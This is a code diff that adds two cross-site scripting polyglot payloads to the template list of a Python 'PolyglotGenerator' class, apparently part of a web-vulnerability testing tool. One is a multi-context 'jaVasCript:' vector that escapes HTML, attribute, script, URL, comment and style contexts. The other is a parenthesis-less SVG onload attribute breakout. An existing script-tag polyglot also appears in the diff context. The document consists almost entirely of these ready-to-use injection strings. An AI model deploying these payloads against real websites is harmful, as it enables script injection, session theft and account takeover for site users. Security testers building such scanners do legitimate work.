@@ -40,6 +40,16 @@ class PolyglotGenerator:
     # Universal polyglot templates
     UNIVERSAL_POLYGLOTS = [
         (
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */{marker}() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={marker}()//>\\x3e",
+            [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.SCRIPT, PolyglotContext.URL, PolyglotContext.COMMENT, PolyglotContext.STYLE],
+            "True universal vector polyglot (HTML/Attr/JS/URI/Comment/Style)",
+        ),
+        (
+            "\"'><svg/onload=alert`{marker}`>",
+            [PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED, PolyglotContext.HTML],
+            "Parenthesis-less SVG attribute breakout polyglot",
+        ),
+        (
             "<script>/*<sCRIPT%20src=x%20onerror={marker}>*/</script>",
             [PolyglotContext.HTML, PolyglotContext.ATTR_DOUBLE, PolyglotContext.ATTR_SINGLE, PolyglotContext.ATTR_UNQUOTED],
             "Universal script tag polyglot"
